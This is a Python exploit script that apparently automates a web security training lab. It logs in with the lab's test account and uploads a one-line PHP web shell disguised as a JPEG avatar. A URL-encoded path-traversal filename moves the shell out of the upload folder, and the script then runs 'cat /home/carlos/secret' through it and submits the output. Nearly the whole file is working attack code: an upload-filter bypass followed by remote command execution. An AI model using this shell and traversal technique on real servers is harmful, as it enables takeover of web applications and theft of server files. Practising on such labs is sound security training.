import requests
import sys
import urllib3, urllib.parse
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def url_encode(str):
    return urllib.parse.quote(str)

def url_decode(str):
    return urllib.parse.unquote(str)

def get_csrf_token(s, url, path):
    target_url = url + path
    r = s.get(target_url, headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value'] # type: ignore
    return csrf

def login_acc(s, url, path, username, password):
    login_url = url + path
    payload = {
        "csrf": get_csrf_token(s, url, path),
        "username": username,
        "password": password
    }
    r = s.post(login_url, data=payload, headers=headers)
    if 'Log out' in r.text:
        print(f'[+] Successful login {username} account')
    else:
        print(f'[-] Fail to login {username} account')
        sys.exit(-1)

def upload_vuln_file(s, url, path, filename):
    target_url = url + path
    multipart_form_data = [
        ('avatar', (filename, "<?php system($_GET['cmd']); ?>", 'image/jpeg')),
        ('user', (None, 'wiener')),
        ('csrf', (None, get_csrf_token(s, url, '/my-account'))),
    ]
    r = s.post(target_url, files=multipart_form_data, allow_redirects=True)
    print(r.text)

    if f'The file avatars/{url_decode(filename)} has been uploaded.' in r.text and r.status_code == 200:
        print('[+] Successful uploaded vuln file')
    else:
        print('[-] Fail to upload vuln file')
        sys.exit(-1)

def get_secret(s, url, path):
    target_url = url + path
    r = s.get(target_url)
    return r.text

def submit_sol(s, url, path, answer):
    target_url = url + path
    payload = { 'answer': answer }
    r = s.post(target_url, data=payload, headers=headers)

    if 'true' in r.text and r.status_code == 200:
        print('[+] Successful solved lab')
        sys.exit(0)
    else:
        print('[-] Fail to solve lab')
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]

    filename = '%2e%2e%2fRunamiYachiyo.php'
    login_acc(s, url, '/login', 'wiener', 'peter')
    upload_vuln_file(s, url, '/my-account/avatar', filename)
    secret = get_secret(s, url, f'/files/avatars/{url_decode(filename)}?cmd=cat /home/carlos/secret')
    submit_sol(s, url, '/submitSolution', secret)

if __name__ == '__main__':
    main()